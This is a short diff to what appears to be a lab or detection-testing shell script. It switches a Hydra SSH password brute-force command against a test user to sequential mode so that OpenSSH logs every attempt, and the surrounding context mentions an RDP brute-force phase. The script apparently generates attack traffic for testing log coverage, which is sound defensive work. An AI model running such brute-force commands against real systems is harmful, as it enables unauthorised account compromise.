@@ -114,7 +114,8 @@ echo ""
 echo "[*] Phase 4: SSH Credential Testing (Hydra)"
 echo "-------------------------------------------"
 echo "[*] Target: ${LINUX_TARGET} | User: testuser"
-hydra -l testuser -P "$WORDLIST" ssh://"${LINUX_TARGET}" -t 4 -V -f || true
+# Use -t 1 (sequential) so OpenSSH logs each password attempt reliably
+hydra -l testuser -P "$WORDLIST" ssh://"${LINUX_TARGET}" -t 1 -V -f || true
 
 # ---- 5. RDP brute-force with Hydra ----
 echo ""
